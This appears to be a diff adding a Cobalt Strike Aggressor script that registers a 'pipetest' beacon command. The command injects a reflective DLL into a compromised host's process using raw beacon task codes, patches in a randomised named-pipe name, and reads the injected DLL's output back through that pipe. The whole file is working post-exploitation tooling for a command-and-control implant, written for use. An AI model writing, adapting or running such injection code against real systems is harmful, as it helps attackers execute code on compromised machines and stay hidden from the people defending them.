@@ -1,0 +1,63 @@
+import beacon.CommandBuilder;
+import common.CommonUtils;
+import common.ReflectiveDLL;
+
+$ORIG_PIPE_NAME = "youcantpatchthis";
+$CALLBACK_TYPE = 32;
+$WAIT_TIME = 15000;
+$DESCRIPTION = "pipetest";
+$JOB_TYPE = 40;
+
+sub inject {
+    $bid = $1;
+    $arch = binfo($1, "barch");
+    $pid = binfo($1, "pid");
+    $builder = [new CommandBuilder];
+
+    if ($arch eq "x64") {
+        $dllBytes =  [CommonUtils readFile: script_resource("bin/ReflectiveDll.x64.dll")];
+        [$builder setCommand: 43];
+    }
+    else {
+        $dllBytes =  [CommonUtils readFile: script_resource("bin/ReflectiveDll.x86.dll")];
+        [$builder setCommand: 9];
+    }    
+    btask($bid, "DLL size: ". strlen($dllBytes));
+
+    $offset = [ReflectiveDLL findReflectiveLoader: $dllBytes];
+    if($offset <= 0) {
+        berror($1, "Could not find ReflectiveLoader");
+        return;
+    }
+  
+    $pipeName = "\\\\.\\pipe\\" . [CommonUtils garbage: $ORIG_PIPE_NAME];
+    btask($bid, "Pipe Name: ". $pipeName);
+    $dllBytes = [CommonUtils strrep: $dllBytes, "\\\\.\\pipe\\" . $ORIG_PIPE_NAME, $pipeName];
+    btask($bid, "DLL size with pipe patched: " . strlen($dllBytes));
+
+    # inject the rDLL
+    [$builder addInteger: parseNumber($pid)];
+    [$builder addInteger: $offset];
+    [$builder addString: [CommonUtils bString: $dllBytes]];
+    $job1 = [$builder build];
+    
+    # get the output from pipe
+    [$builder setCommand: $JOB_TYPE];
+    [$builder addInteger: parseNumber($pid)];
+    [$builder addShort: $CALLBACK_TYPE];
+    [$builder addShort: $WAIT_TIME];
+    [$builder addLengthAndString: $pipeName];
+    [$builder addLengthAndString: $DESCRIPTION];
+    $job2 = [$builder build];
+    call("beacons.task", $null, $bid, cast($job1, 'b'));
+    call("beacons.task", $null, $bid, cast($job2, 'b'));
+}
+
+alias pipetest {
+    $bid = $1;
+    inject($bid);
+}
+
+beacon_command_register(
+    "pipetest",
+    "Test pipe output in beacon.");
